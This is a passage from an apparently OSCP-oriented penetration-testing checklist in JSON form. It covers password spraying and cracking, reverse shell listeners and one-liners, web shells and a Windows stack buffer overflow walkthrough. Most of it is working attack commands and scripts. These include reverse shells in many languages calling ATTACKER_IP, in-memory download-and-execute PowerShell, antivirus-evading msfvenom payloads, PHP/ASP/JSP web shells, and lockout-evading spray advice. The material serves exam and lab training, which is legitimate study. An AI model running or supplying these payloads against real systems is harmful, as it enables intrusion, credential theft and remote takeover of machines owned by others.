<HASH_FILE> -a 1 wordlist1.txt wordlist2.txt\n\n# John the Ripper (fallback/different formats)\njohn --wordlist=/usr/share/wordlists/rockyou.txt <HASH_FILE>\njohn --format=NT <HASH_FILE> --wordlist=/usr/share/wordlists/rockyou.txt\njohn --format=sha512crypt <HASH_FILE> --wordlist=/usr/share/wordlists/rockyou.txt\njohn --show <HASH_FILE>\njohn --list=formats | grep -i '<FORMAT>'\n\n# Convert hash formats for john\npython3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash\npython3 /usr/share/john/keepass2john.py db.kdbx > keepass.hash\npython3 /usr/share/john/zip2john.py archive.zip > zip.hash\npython3 /usr/share/john/rar2john.py archive.rar > rar.hash\n\n# Online lookup (non-salted hashes)\n# https://crackstation.net/\n# https://hashes.com/en/decrypt/hash\n# https://md5decrypt.net/"
      }
    ],
    "brief_description": "Use hashcat with rules first — best64.rule cracks many hashes wordlists alone miss. Identify format precisely before cracking."
  },
  {
    "id": "item-70",
    "phase": "5. Exploitation",
    "step": "5.18 Password Attacks",
    "title": "Password spraying & custom wordlists",
    "feasible_when": "Valid usernames enumerated and target service accepts password authentication.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# CrackMapExec spraying\ncrackmapexec smb <TARGET_IP> -u users.txt -p 'Password1!' --continue-on-success\ncrackmapexec smb <TARGET_IP> -u users.txt -p 'Welcome1!' --continue-on-success\ncrackmapexec smb <NETWORK_CIDR> -u administrator -H <NTLM_HASH> --local-auth\ncrackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt --no-brute --continue-on-success  # pair-wise\n\n# Kerbrute (Kerberos — evades lockout, very stealthy)\nkerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt 'Password1!'\nkerbrute bruteuser -d <DOMAIN> --dc <DC_IP> /usr/share/wordlists/rockyou.txt <USER>\n\n# Hydra spraying\nhydra -L users.txt -p 'Password1!' smb://<TARGET_IP>\nhydra -L users.txt -p 'Summer2024!' ssh://<TARGET_IP>\nhydra -L users.txt -p 'Welcome1!' rdp://<TARGET_IP> -t 1  # RDP: 1 thread!\n\n# Spray timing (avoid lockout)\n# Wait 30+ minutes between rounds if lockout is 5 attempts / 30 min\n# Use CrackMapExec --jitter flag\ncrackmapexec smb <TARGET_IP> -u users.txt -p 'Password1!' --continue-on-success --jitter 3\n\n# Good spray passwords\n# Seasons: Spring2024!, Summer2024!, Fall2024!, Winter2024!\n# Company name: Company2024!, Company123!\n# Common: Password1!, Welcome1!, P@ssw0rd, Passw0rd!\n\n# cewl — harvest words from target website\ncewl http://<TARGET_IP> -d 3 -m 5 -w /tmp/cewl_words.txt\n\n# cupp — personal info based wordlist\ncupp -i  # interactive\ncupp -l  # download default wordlists\n\n# crunch\ncrunch 8 8 -t @@@@%^^^ -o /tmp/wordlist.txt  # 4 letters, 1 digit, 3 special\ncrunch 8 10 abcdefghijklmnopqrstuvwxyz0123456789 -o /tmp/charset.txt\n\n# hashcat wordlist mutation\nhashcat /tmp/cewl_words.txt -r /usr/share/hashcat/rules/best64.rule --stdout > /tmp/mutated.txt\ncat /usr/share/wordlists/rockyou.txt /tmp/cewl_words.txt | sort -u > /tmp/combined.txt"
      }
    ],
    "brief_description": "Spray one password at a time with 30+ min delays. Use seasonal/company-themed passwords first — they work."
  },
  {
    "id": "item-71",
    "phase": "5. Exploitation",
    "step": "5.19 Listener Setup",
    "title": "Reverse shell listener setup",
    "feasible_when": "A code execution vector has been identified — set up listener BEFORE triggering the shell.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Netcat (basic)\nnc -nlvp <PORT>\nrlwrap nc -nlvp <PORT>              # readline support (arrow keys, history)\n\n# Socat (fully interactive TTY)\nsocat file:`tty`,raw,echo=0 TCP-LISTEN:<PORT>,reuseaddr\n\n# Metasploit multi/handler\nmsfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT <PORT>; set ExitOnSession false; run -j'\nmsfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT <PORT>; run'\n\n# Pwncat-cs (auto-stabilization + file transfer)\npwncat-cs -lp <PORT>\npwncat-cs bind -m linux <TARGET_IP> <PORT>  # bind shell\n\n# Multiple ports at once (useful for exam)\nfor port in 443 80 4444 4445; do rlwrap nc -nlvp $port & done\n\n# HTTPS listener (bypass SSL inspection)\n# Generate cert\nopenssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes -subj '/CN=<TARGET_IP>'\nsocat OPENSSL-LISTEN:<PORT>,cert=/tmp/cert.pem,key=/tmp/key.pem,verify=0 FILE:`tty`,raw,echo=0"
      }
    ],
    "brief_description": "Set up listener BEFORE triggering execution. Use rlwrap for readline support, pwncat-cs for auto-stabilization."
  },
  {
    "id": "item-72",
    "phase": "5. Exploitation",
    "step": "5.19 Reverse Shells",
    "title": "Linux reverse shells",
    "feasible_when": "RCE confirmed on Linux target with outbound TCP allowed.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# bash (most reliable)\nbash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\nbash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'\n/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\n0<&196;exec 196<>/dev/tcp/<ATTACKER_IP>/<PORT>; sh <&196 >&196 2>&196\n\n# mkfifo (very stable)\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> <PORT> >/tmp/f\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <ATTACKER_IP> <PORT> >/tmp/f\n\n# Python3\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<ATTACKER_IP>\",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n\n# Python3 pty (more stable)\npython3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect((\"<ATTACKER_IP>\",<PORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'\n\n# Python2\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<ATTACKER_IP>\",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'\n\n# Perl\nperl -e 'use Socket;$i=\"<ATTACKER_IP>\";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}'\n\n# PHP\nphp -r '$sock=fsockopen(\"<ATTACKER_IP>\",<PORT>);exec(\"/bin/bash -i <&3 >&3 2>&3\");'\nphp -r '$sock=fsockopen(\"<ATTACKER_IP>\",<PORT>);shell_exec(\"/bin/bash -i <&3 >&3 2>&3\");'\nphp -r '$sock=fsockopen(\"<ATTACKER_IP>\",<PORT>);popen(\"/bin/bash -i <&3 >&3 2>&3\", \"r\");'\n\n# Ruby\nruby -rsocket -e 'f=TCPSocket.open(\"<ATTACKER_IP>\",<PORT>).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'\n\n# Netcat\nnc <ATTACKER_IP> <PORT> -e /bin/bash\nnc -e /bin/bash <ATTACKER_IP> <PORT>\nnc.traditional <ATTACKER_IP> <PORT> -e /bin/bash\n\n# Netcat (no -e option — busybox)\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> <PORT> >/tmp/f\n\n# Socat (fully interactive)\nsocat tcp:<ATTACKER_IP>:<PORT> exec:/bin/bash,pty,stderr,setsid,sigint,sane\n\n# Golang\necho 'package main;import(\"os/exec\";\"net\");func main(){c,_:=net.Dial(\"tcp\",\"<ATTACKER_IP>:<PORT>\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rev.go && cd /tmp && go run rev.go\n\n# Lua\nlua -e 'local s=require(\"socket\");local t=assert(s.tcp());t:connect(\"<ATTACKER_IP>\",<PORT>);while true do local r,x=t:receive();local f=assert(io.popen(r,\"r\"));local b=assert(f:read(\"*a\"));t:send(b);end;f:close();'\n\n# AWK\nawk 'BEGIN {s = \"/inet/tcp/0/<ATTACKER_IP>/<PORT>\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; print c; while ((c |& getline) > 0) print |& s; close(c); } while(c != \"exit\") close(s); }}'\n\n# Reverse shell generator\n# https://www.revshells.com/\n# https://github.com/0dayCTF/reverse-shell-generator"
      }
    ],
    "brief_description": "Keep all variants ready — different targets have different available tools. mkfifo + nc is most universally stable."
  },
  {
    "id": "item-73",
    "phase": "5. Exploitation",
    "step": "5.19 Reverse Shells",
    "title": "Windows reverse shells",
    "feasible_when": "RCE confirmed on Windows target with outbound TCP allowed.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# PowerShell reverse shell (one-liner)\npowershell -nop -w hidden -ep bypass -c \"$c=New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}\"\n\n# Download + execute in memory\npowershell -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1')\"\npowershell -nop -ep bypass -c \"iwr -UseBasicParsing http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1 | iex\"\n\n# PowerShell HTTPS\npowershell -nop -ep bypass -c \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object Net.WebClient).DownloadString('https://<ATTACKER_IP>/rev.ps1')\""
      },
      {
        "lang": "bash",
        "code": "# msfvenom payloads\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o rev.exe\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o rev.dll\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o rev.msi\nmsfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f asp > rev.asp\nmsfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f aspx > rev.aspx\nmsfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f hta-psh > rev.hta\nmsfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f vba > rev.vba  # Office macro\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw | base64 -w0  # shellcode\n\n# Staged payloads (smaller, needs handler)\nmsfvenom -p windows/x64/shell/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o staged.exe\n\n# Encoding to evade AV\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -e x64/xor_dynamic -i 3 -f exe -o enc_rev.exe\n\n# Netcat (if nc.exe available on target)\nnc.exe <ATTACKER_IP> <PORT> -e cmd.exe\n\n# CMD reverse shell via certutil download\ncmd /c certutil -urlcache -f http://<ATTACKER_IP>/nc.exe C:\\Windows\\Temp\\nc.exe && C:\\Windows\\Temp\\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe\n\n# Nishang reverse shells\n# Invoke-PowerShellTcp\n# Invoke-PowerShellTcpOneLine"
      }
    ],
    "brief_description": "Generate payloads in multiple formats (exe, dll, asp, msi, hta) depending on execution context. Stage if size-limited."
  },
  {
    "id": "item-74",
    "phase": "5. Exploitation",
    "step": "5.19 Reverse Shells",
    "title": "Shell stabilization (Linux TTY upgrade)",
    "feasible_when": "A raw/dumb reverse shell on Linux — no TTY, Ctrl+C kills shell, no tab completion.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Method 1 — Python pty (most reliable)\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# OR: python -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Background the shell: Ctrl+Z\nstty raw -echo; fg\nreset\nexport TERM=xterm-256color\nexport SHELL=bash\nstty rows 50 columns 200  # match your terminal size\n# Check your terminal: stty size\n\n# Method 2 — socat upgrade (requires socat on target)\n# Attacker — open socat listener:\nsocat file:`tty`,raw,echo=0 TCP-LISTEN:4445,reuseaddr\n# Target — upgrade to socat:\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:<ATTACKER_IP>:4445\n\n# Method 3 — script command\nscript /dev/null -c bash\n# Ctrl+Z → stty raw -echo → fg → reset → export TERM=xterm-256color\n\n# Method 4 — rlwrap (before catching shell)\nrlwrap nc -nlvp <PORT>\n\n# Method 5 — pwncat-cs (auto-handles all)\npwncat-cs -lp <PORT>\n# Once shell caught:\npwncat > upload /tmp/linpeas.sh /tmp/linpeas.sh\npwncat > download /etc/shadow ./shadow\n\n# Get terminal dimensions from attacker (paste into shell)\nstty -a | head -1  # check attacker term size\nstty rows <ROWS> cols <COLS>  # paste on target\n\n# PowerShell stabilization (Windows)\n# Get a PowerShell from cmd:\npowershell.exe\npowershell -NoProfile -NonInteractive -NoLogo"
      }
    ],
    "brief_description": "Upgrade shell immediately — raw shells drop on Ctrl+C. Python pty + stty raw -echo + fg is the standard method."
  },
  {
    "id": "item-75",
    "phase": "5. Exploitation",
    "step": "5.20 Web Shell Deployment",
    "title": "Web shell upload & usage",
    "feasible_when": "File upload or write access to web directory is available.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Simple PHP web shell\necho '<?php system($_GET[\"cmd\"]); ?>' > shell.php\necho '<?php echo shell_exec($_REQUEST[\"cmd\"]); ?>' > shell.php\necho '<?php if(isset($_REQUEST[\"cmd\"])){system($_REQUEST[\"cmd\"]);}else{echo \"shell\";} ?>' > shell.php\n\n# PHP reverse shell (pentestmonkey)\ncurl -o shell.php https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n# Edit IP and port, then upload\n\n# ASP web shell (Windows/IIS)\necho '<%eval request(\"cmd\")%>' > shell.asp\n\n# ASPX web shell\necho '<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + Request[\"cmd\"]); %>' > shell.aspx\n\n# JSP web shell (Tomcat)\necho '<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>' > shell.jsp\n\n# Usage\ncurl 'http://<TARGET_IP>/uploads/shell.php?cmd=id'\ncurl 'http://<TARGET_IP>/uploads/shell.php?cmd=id' -o /dev/null -w '%{http_code}'  # check\n\n# Upgrade web shell to reverse shell\ncurl 'http://<TARGET_IP>/uploads/shell.php?cmd=bash+-c+\"bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/<PORT>+0>%261\"'\ncurl --data-urlencode 'cmd=bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\"' http://<TARGET_IP>/shell.php\n\n# Windows web shell\ncurl 'http://<TARGET_IP>/shell.aspx?cmd=whoami'\ncurl 'http://<TARGET_IP>/shell.aspx?cmd=powershell+-c+\"IEX(New-Object+Net.WebClient).DownloadString(''http://<ATTACKER_IP>/rev.ps1'')\"'"
      }
    ],
    "brief_description": "Web shells provide persistent RCE — always upgrade to a reverse shell for better interactivity."
  },

  // ============================================================
  // PHASE 6 — BUFFER OVERFLOW (OSCP SPECIFIC)
  // ============================================================
  {
    "id": "item-bof-1",
    "phase": "6. Buffer Overflow (Windows x86 Stack BOF)",
    "step": "6.1 Recon & Spiking",
    "title": "Identify the vulnerable service and triggering command",
    "feasible_when": "A custom or legacy network service is running on a non-standard port; the OSCP exam or lab notes indicate a BOF machine.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Connect and banner grab\nnc -nv <TARGET_IP> <PORT>\ntelnet <TARGET_IP> <PORT>\n\n# Try each command manually and observe response\n# Note which commands accept variable-length input\n\n# Install Immunity Debugger + mona.py on Windows VM\n# Attach: File → Attach → select the service process\n# Or: Debug → Open → browse to the .exe\n\n# mona setup (run in Immunity command bar)\n!mona config -set workingfolder C:\\mona\\%p\n\n# generic_send_tcp spike file (.spk)\n# Create: command.spk\ns_readline();\ns_string(\"<COMMAND> \");\ns_string_variable(\"0\");\n\n# Run spike\ngeneric_send_tcp <TARGET_IP> <PORT> command.spk 0 0\n\n# Watch Immunity — look for access violation (EIP overwrite)\n# Note which command causes the crash\n\n# Manually confirm\nnc -nv <TARGET_IP> <PORT>\n<COMMAND> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      }
    ],
    "brief_description": "Connect to the service and identify which commands accept user input — find the crash trigger before fuzzing."
  },
  {
    "id": "item-bof-2",
    "phase": "6. Buffer Overflow (Windows x86 Stack BOF)",
    "step": "6.2 Fuzzing",
    "title": "Crash the application and identify approximate crash length",
    "feasible_when": "The vulnerable command has been identified via spiking. Immunity Debugger is attached.",
    "snippets": [
      {
        "lang": "python",
        "code": "#!/usr/bin/env python3\n# fuzzer.py — increments buffer by 100 bytes each round\nimport socket, time, sys\n\nip   = \"<TARGET_IP>\"\nport = <PORT>\nprefix   = \"<COMMAND> \"   # e.g. \"OVERFLOW1 \"\ntimeout  = 5\nstring   = \"A\" * 100\n\nwhile True:\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.settimeout(timeout)\n            s.connect((ip, port))\n            s.recv(1024)                        # receive banner\n            print(f\"[*] Sending {len(string)} bytes...\")\n            s.send((prefix + string + \"\\r\\n\").encode(\"latin-1\"))\n            s.recv(1024)\n    except Exception as e:\n        print(f\"[!] Crash at approximately {len(string)} bytes\")\n        print(f\"    Error: {e}\")\n        sys.exit(0)\n    string += \"A\" * 100\n    time.sleep(1)"
      },
      {
        "lang": "bash",
        "code": "# Run fuzzer\npython3 fuzzer.py\n\n# In Immunity Debugger:\n# — When crash occurs: note EIP = 41414141 (AAAA)\n# — Note approximate crash size from fuzzer output\n# — Note ESP and its surrounding bytes\n# — Click View → CPU — check registers\n\n# Restart the application\n# Ctrl+F2 in Immunity OR:\n# Debug → Restart (Ctrl+F2)\n# Debug → Run (F9) to continue after restart"
      }
    ],
    "brief_description": "Increment by 100 bytes until crash — note the approximate size and confirm EIP = 41414141 (AAAA)."
  },
  {
    "id": "item-bof-3",
    "phase": "6. Buffer Overflow (Windows x86 Stack BOF)",
    "step": "6.3 Find Exact EIP Offset",
    "title": "Generate cyclic pattern and identify exact EIP offset",
    "feasible_when": "Approximate crash length is known from the fuzzing phase. Immunity Debugger is attached.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Generate cyclic pattern (crash_length + 400 for safety)\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <CRASH_LENGTH_PLUS_400>\n# Example: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400\n\n# Alternative: python pwntools\npython3 -c \"import pwn; print(pwn.cyclic(<CRASH_LENGTH_PLUS_400>)\"\n\n# Alternative: msf-pattern_create (newer Kali)\nmsf-pattern_create -l <CRASH_LENGTH_PLUS_400>"
      },
      {
        "lang": "python",
        "code": "#!/usr/bin/env python3\n# pattern_send.py — send cyclic pattern\nimport socket\n\nip      = \"<TARGET_IP>\"\nport    = <PORT>\nprefix  = \"<COMMAND> \"\n\n# Paste pattern from pattern_create output below\npayload = b\"<CYCLIC_PATTERN_HERE>\"\n\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    s.settimeout(5)\n    s.connect((ip, port))\n    s.recv(1024)\n    print(f\"[*] Sending pattern ({len(payload)} bytes)...\")\n    s.send((prefix.encode() + payload + b\"\\r\\n\"))\n    s.recv(1024)\nprint(\"[*] Done — check EIP in Immunity Debugger\")"
      },
      {
        "lang": "bash",
        "code": "# After crash: read EIP value from Immunity Debugger registers panel\n# EIP will show something like: 35724134\n\n# Find offset\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_VALUE>\n# Example: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134\n# Output: [*] Exact match at offset 1978\n\n# Alternative\nmsf-pattern_offset -l <CRASH_LENGTH_PLUS_400> -q <EIP_VALUE>\n\n# pwntools alternative\npython3 -c \"import pwn; print(pwn.cyclic_find(0x<EIP_HEX>))\""
      },
      {
        "lang": "python",
        "code": "#!/usr/bin/env python3\n# confirm_offset.py — confirm EIP control\nimport socket\n\nip      = \"<TARGET_IP>\"\nport    = <PORT>\nprefix  = \"<COMMAND> \"\noffset  = <EXACT_OFFSET>    # from pattern_offset\n\n# EIP should become BBBB (42424242)\npayload = b\"A\" * offset + b\"B\" * 4 + b\"C\" * 500\n\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    s.settimeout(5)\n    s.connect((ip, port))\n    s.recv(1024)\n    print(f\"[*] Confirming offset at {offset}...\")\n    s.send((prefix.encode() + payload + b\"\\r\\n\"))\n    s.recv(1024)\nprint(\"[*] Check Immunity — EIP should = 42424242 (BBBB)\")\nprint(\"[*] ESP should point to CCCC block\")"
      }
    ],
    "brief_description": "Send cyclic pattern, read EIP in Immunity, run pattern_offset to get exact byte offset. Confirm with BBBB in EIP."
  },
  {
    "id": "item-bof-4",
    "phase": "6. Buffer Overflow (Windows x86 Stack BOF)",
    "step": "6.4 Bad Character Analysis",
    "title": "Identify all bad characters that corrupt the payload",
    "feasible_when": "Exact EIP offset is confirmed. Immunity Debugger with mona.py is attached and workingfolder is set.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Generate bytearray in mona (exclude \\x00 always)\n!mona bytearray -b \"\\x00\"\n# Output: C:\\mona\\<appname>\\bytearray.bin and bytearray.txt\n\n# After each test run:\n# 1. Note the ESP value from Immunity registers\n# 2. Run mona compare:\n!mona compare -f C:\\mona\\<APPNAME>\\bytearray.bin -a <ESP_ADDRESS>\n# Example: !mona compare -f C:\\mona\\brainpan\\bytearray.bin -a 0185FA30\n\n# If bad chars found, regenerate excluding them:\n!mona bytearray -b \"\\x00\\x<BAD1>\\x<BAD2>\"\n# Re-send payload and compare again\n# Repeat until result shows: Unmodified"
      },
      {
        "lang": "python",
        "code": "#!/usr/bin/env python3\n# badchar_test.py — send all chars except known bad ones\nimport socket\n\nip      = \"<TARGET_IP>\"\nport    = <PORT>\nprefix  = \"<COMMAND> \"\noffset  = <EXACT_OFFSET>\n\n# Remove identified bad chars from this list as you find them\n# Always remove \\x00 (null byte) first — almost always bad\nbadchars = (\n    b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\"\n    b\"\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\"\n    b\"\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\"\n    b\"\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\"\n    b\"\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\"\n    b\"\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\"\n    b\"\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\"\n    b\"\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\"\n    b\"\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\"\n    b\"\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\"\n    b\"\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\"\n    b\"\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\"\n    b\"\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\"\n    b\"\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\"\n    b\"\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\"\n    b\"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n)\n\npayload = b\"A\" * offset + b\"B\" * 4 + badchars\n\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    s.settimeout(5)\n    s.connect((ip, port))\n    s.recv(1024)\n    print(f\"[*] Sending badchar test ({len(payload)} bytes)...\")\n    s.send((prefix.encode() + payload + b\"\\r\\n\"))\n    s.recv(1024)\nprint(\"[*] Done — note ESP value and run mona compare\")\nprint(\"[*] !mona compare -f C:\\\\mona\\\\<APPNAME>\\\\bytearray.bin -a <ESP_ADDRESS>\")"
      }
    ],
    "brief_description": "Send all 255 bytes, use mona compare to find corrupted bytes. Regenerate bytearray excluding each bad char. Repeat until 'Unmodified'."
  },
  {
    "id": "item-bof-5",
    "phase": "6. Buffer Overflow (Windows x86 Stack BOF)",
    "step": "6.5 Find JMP ESP",
    "title": "Locate a JMP ESP gadget free of bad characters",
    "feasible_when": "All bad characters are confirmed. EIP offset is known. Immunity Debugger with mona.py is running.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# List all loaded modules and their protections\n!mona modules\n# Look for columns: Rebase | SafeSEH | ASLR | NXCompat | OS DLL\n# Target module with ALL False/False/False/False/False\n# Prefer application's own DLLs — they are less likely to change\n\n# Find JMP ESP (opcode \\xff\\xe4) in that module\n!mona find -s \"\\xff\\xe4\" -m <MODULE_NAME.dll>\n# Example: !mona find -s \"\\xff\\xe4\" -m essfunc.dll\n\n# Alternative: find in all modules\n!mona jmp -r esp\n!mona jmp -r esp -cpb \"\\x00\\x0a\\x0d\"   # exclude bad chars\n\n# Verify: no bad characters in the JMP ESP address\n# Example address: 0x625011AF → bytes: 62 50 11 AF — check each against badchar list\n\n# Verify the address in Immunity\n# Ctrl+G → type address → press Enter → confirm: FFE4 = JMP ESP\n\n# Convert JMP ESP to hex manually\n/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb\nnasm > JMP ESP     →   FFE4\nnasm > CALL ESP    →   FFD4\nnasm > PUSH ESP; RET → 54C3\n\n# Set breakpoint on JMP ESP address to test\n# In Immunity: Ctrl+G → enter address → F2 to set breakpoint\n# Run exploit → should pause at breakpoint → ESP points to your shellcode area"
      }
    ],
    "brief_description": "Find a JMP ESP in a module with no ASLR/SafeSEH, whose address contains no bad characters. Verify with a breakpoint."
  },
  {
    "id": "item-bof-6",
    "phase": "6. Buffer Overflow (Windows x86 Stack BOF)",
    "step": "6.6 Generate Shellcode",
    "title": "Generate msfvenom shellcode excluding bad characters",
    "feasible_when": "Bad characters are fully identified and the JMP ESP address is confirmed.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Standard reverse shell shellcode\nmsfvenom -p windows/shell_reverse_tcp \\\n  LHOST=<ATTACKER_IP> LPORT=<PORT> \\\n  EXITFUNC=thread \\\n  -b \"\\x00<\\xBAD1>\\x<BAD2>\" \\\n  -f py -v shellcode\n# Example: -b \"\\x00\\x0a\\x0d\"\n\n# x64 payload (if 64-bit process)\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n  LHOST=<ATTACKER_IP> LPORT=<PORT> \\\n  EXITFUNC=thread \\\n  -b \"\\x00\\x<BAD1>\" \\\n  -f py -v shellcode\n\n# Meterpreter (staged — smaller)\nmsfvenom -p windows/meterpreter/reverse_tcp \\\n  LHOST=<ATTACKER_IP> LPORT=<PORT> \\\n  EXITFUNC=thread \\\n  -b \"\\x00\\x<BAD1>\" \\\n  -f py -v shellcode\n\n# Encode with shikata_ga_nai\nmsfvenom -p windows/shell_reverse_tcp \\\n  LHOST=<ATTACKER_IP> LPORT=<PORT> \\\n  EXITFUNC=thread \\\n  -b \"\\x00\\x<BAD1>\" \\\n  -e x86/shikata_ga_nai -i 3 \\\n  -f py -v shellcode\n\n# Verify shellcode does not contain bad characters\n# Run: echo '<SHELLCODE_HEX>' | xxd | grep -E '<BAD_HEX>'\n\n# Set up listener BEFORE sending the 